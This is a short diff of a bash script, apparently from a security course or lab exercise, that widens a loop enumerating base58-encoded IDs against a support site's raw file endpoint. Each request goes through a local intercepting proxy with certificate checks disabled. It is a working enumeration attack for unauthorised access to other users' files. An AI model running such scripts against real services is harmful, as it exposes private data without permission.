@@ -17,10 +17,10 @@ split_input() {
 }
 
 
-for i in $(seq 3800 3900)
+for i in $(seq 3000 10000)
 do
-	#file=$(echo -n "$i:1"| base58)
-	file=$(echo -n "$1:$i"| base58)
+	file=$(echo -n "$i:1"| base58)
+	#file=$(echo -n "$1:$i"| base58)
 	response=$(curl -s --proxy http://127.0.0.1:8080 -k -i "https://support.quoccabank.com/raw/$file" --write-out '%{json}')
 	split_input $response $i $file
 	sleep 0.1
